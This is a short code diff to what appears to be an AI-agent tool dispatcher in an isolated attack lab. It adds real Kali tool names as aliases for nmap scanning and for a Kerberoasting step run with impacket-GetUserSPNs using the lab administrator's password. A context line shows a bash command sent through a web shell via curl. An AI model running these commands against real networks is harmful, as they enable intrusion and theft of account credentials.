@@ -789,7 +789,10 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
     # ── Sandbox tool execution via portal5-attack container ──────────────────
     port = fn_args.get("port", 445)
 
-    if fn_name == "run_nmap_scan":
+    if fn_name in ("run_nmap_scan", "nmap"):
+        # "nmap" is the real Kali binary name the capability library declares
+        # (smb_probe/winrm_probe/ldap_probe/kerberos_probe); same live action
+        # as run_nmap_scan, just under its real-tool name (P5-EMERGENT-001).
         # Python TCP connect — no cap_net_raw needed in DinD
         target = fn_args.get("target", dc)
         code = (
@@ -820,7 +823,10 @@ echo "banner=$(curl -s "$SHELL_URL?cmd=bash%20-c%20%27(echo%3B%20sleep%202)%20%7
         r = _lab_mcp_call(cmd, timeout=60)  # type: ignore[misc]
         return parse_sandbox_output(r.get("output", ""))[1] or "[check_cve: no output]"
 
-    if fn_name == "exploit_service":
+    if fn_name in ("exploit_service", "impacket-GetUserSPNs"):
+        # "impacket-GetUserSPNs" is the real Kali binary name the capability
+        # library declares (ldap_probe/kerberos_probe); same live action as
+        # exploit_service, just under its real-tool name (P5-EMERGENT-001).
         # Kerberoast — best available unauthenticated-to-hash path in portal.lab
         cmd = (
             f"impacket-GetUserSPNs {_LAB_DOMAIN}/administrator:{_LAB_ADMIN_PASS}"
